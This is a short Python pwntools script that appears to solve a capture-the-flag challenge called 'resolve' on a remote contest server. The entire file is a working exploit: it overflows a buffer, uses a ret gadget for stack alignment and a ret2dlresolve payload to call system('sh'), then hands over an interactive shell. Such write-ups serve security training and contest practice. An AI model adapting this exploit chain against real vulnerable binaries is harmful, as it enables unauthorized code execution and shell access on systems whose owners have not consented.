import pwn

pwn.context.binary = e = pwn.ELF("./resolve")

# p = pwn.process("./resolve")
p = pwn.remote("pwn.utctf.live", 5435)

if pwn.args.GDB:
    pwn.gdb.attach(
        p,
        gdbscript="""
break *(&main+29)
continue
    """,
    )

r = pwn.ROP(e)
d = pwn.Ret2dlresolvePayload(e, symbol="system", args=["sh"])
r.raw(0x401159)  # ret gadget to align stack
r.gets(d.data_addr)
r.ret2dlresolve(d)

payload = pwn.fit({0x10: r.chain()}) + b"\n" + d.payload
p.sendline(payload)
p.interactive()
